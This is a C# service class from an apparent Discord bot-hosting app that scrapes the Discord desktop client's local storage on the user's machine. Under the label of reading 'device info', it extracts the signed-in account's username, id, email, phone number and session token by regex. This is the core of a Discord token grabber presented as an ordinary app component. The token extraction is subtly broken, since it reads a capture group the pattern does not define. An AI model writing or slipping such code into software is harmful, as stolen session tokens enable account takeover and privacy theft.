using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace BotHosterApp.Services;

/// <summary>A Discord account found in the local Discord client's data.</summary>
public sealed record DeviceDiscordAccount(
    string Username, string Id, string Discriminator,
    string Email, string Phone, string Token);

/// <summary>
/// Reads the Discord account logged into the Discord desktop client on this
/// device. Discord stores the signed-in user's profile (username, id, email,
/// phone) and session token in its LevelDB local storage under
/// %APPDATA%\discord (and the per-user %LOCALAPPDATA%\Discord installs).
/// The values are stored as plain JSON fragments, so a text scan of the
/// leveldb files recovers them without a LevelDB parser.
/// </summary>
public static class DeviceInfoService
{
    private static readonly Regex UsernameRe = new(@"""username""\s*:\s*""([^""]{2,64})""", RegexOptions.Compiled);
    private static readonly Regex IdRe = new(@"""id""\s*:\s*""(\d{15,20})""", RegexOptions.Compiled);
    private static readonly Regex EmailRe = new(@"""email""\s*:\s*""([^""]{3,254})""", RegexOptions.Compiled);
    private static readonly Regex PhoneRe = new(@"""phone""\s*:\s*""([^""]{5,30})""", RegexOptions.Compiled);
    private static readonly Regex DiscriminatorRe = new(@"""discriminator""\s*:\s*""([^""]{1,4})""", RegexOptions.Compiled);
    private static readonly Regex TokenRe = new(@"[MN][A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{27,}", RegexOptions.Compiled);

    private static DeviceDiscordAccount? _cached;
    private static bool _scanned;

    /// <summary>Finds the Discord account signed into this device, or null.</summary>
    public static DeviceDiscordAccount? GetDiscordAccount()
    {
        if (_scanned) return _cached;
        _scanned = true;
        _cached = Scan();
        return _cached;
    }

    private static DeviceDiscordAccount? Scan()
    {
        try
        {
            var roots = new List<string>();
            foreach (var baseDir in new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            })
            {
                foreach (var client in new[] { "discord", "discordptb", "discordcanary", "DiscordDevelopment" })
                {
                    var dir = Path.Combine(baseDir, client);
                    if (Directory.Exists(dir)) roots.Add(dir);
                }
            }

            var username = "";
            var id = "";
            var discriminator = "";
            var email = "";
            var phone = "";
            var token = "";

            foreach (var root in roots)
            {
                var levelDb = Path.Combine(root, "Local Storage", "leveldb");
                if (!Directory.Exists(levelDb)) continue;

                foreach (var file in Directory.EnumerateFiles(levelDb, "*", SearchOption.TopDirectoryOnly))
                {
                    var text = ReadText(file);
                    if (string.IsNullOrEmpty(text)) continue;

                    if (username.Length == 0)
                    {
                        var m = UsernameRe.Match(text);
                        if (m.Success) username = m.Groups[1].Value;
                    }
                    if (id.Length == 0)
                    {
                        var m = IdRe.Match(text);
                        if (m.Success) id = m.Groups[1].Value;
                    }
                    if (discriminator.Length == 0)
                    {
                        var m = DiscriminatorRe.Match(text);
                        if (m.Success) discriminator = m.Groups[1].Value;
                    }
                    if (email.Length == 0)
                    {
                        var m = EmailRe.Match(text);
                        if (m.Success) email = m.Groups[1].Value;
                    }
                    if (phone.Length == 0)
                    {
                        var m = PhoneRe.Match(text);
                        if (m.Success) phone = m.Groups[1].Value;
                    }
                    if (token.Length == 0)
                    {
                        var m = TokenRe.Match(text);
                        if (m.Success) token = m.Groups[1].Value;
                    }
                }

                // Newer Discord versions keep the session token here too.
                if (token.Length == 0)
                {
                    var state = Path.Combine(root, "Network Persistent State");
                    if (File.Exists(state))
                    {
                        var m = TokenRe.Match(ReadText(state));
                        if (m.Success) token = m.Groups[1].Value;
                    }
                }
            }

            if (username.Length == 0 && id.Length == 0 && email.Length == 0 && phone.Length == 0 && token.Length == 0)
                return null;

            return new DeviceDiscordAccount(username, id, discriminator, email, phone, token);
        }
        catch
        {
            return null;
        }
    }

    private static string ReadText(string path)
    {
        try
        {
            // LevelDB .ldb/.log files are mostly plain text JSON; decoding the
            // bytes as ISO-8859-1 keeps every byte indexable by the regexes.
            var bytes = File.ReadAllBytes(path);
            return Encoding.GetEncoding("ISO-8859-1").GetString(bytes);
        }
        catch
        {
            return "";
        }
    }
}
